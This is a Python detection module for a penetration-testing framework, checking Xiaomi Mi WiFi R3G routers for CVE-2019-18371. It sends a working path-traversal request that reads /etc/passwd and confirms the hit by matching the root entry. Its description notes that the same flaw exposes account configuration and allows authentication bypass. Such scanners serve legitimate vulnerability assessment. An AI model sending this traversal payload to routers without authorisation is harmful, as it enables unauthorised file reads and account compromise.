#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Xiaomi Mi WiFi R3G devices before 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Xiaomi Mi WiFi R3G Routers - Local file Inclusion Detection',
        'description': 'Xiaomi Mi WiFi R3G devices before 2.28.23-stable are susceptible to local file inclusion vulnerabilities via a misconfigured NGINX alias, as demonstrated by api-third-party/download/extdisks../etc/config/account. With this vulnerability, the attacker can bypass authentication.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'lfi', 'router', 'mi', 'xiaomi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://ultramangaia.github.io/blog/2019/Xiaomi-Series-Router-Command-Execution-Vulnerability.html',
            'https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC/blob/master/arbitrary_file_read_vulnerability.py',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-18371',
            'https://github.com/password520/Penetration_PoC',
            'https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC',
        ],
        'cve': 'CVE-2019-18371',
    }

    def run(self):
        r = self.http_request(method="GET", path='/api-third-party/download/extdisks../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Xiaomi Mi WiFi R3G Routers - Local file Inclusion detected",
                path='/api-third-party/download/extdisks../etc/passwd',
            )
            return True
        return False

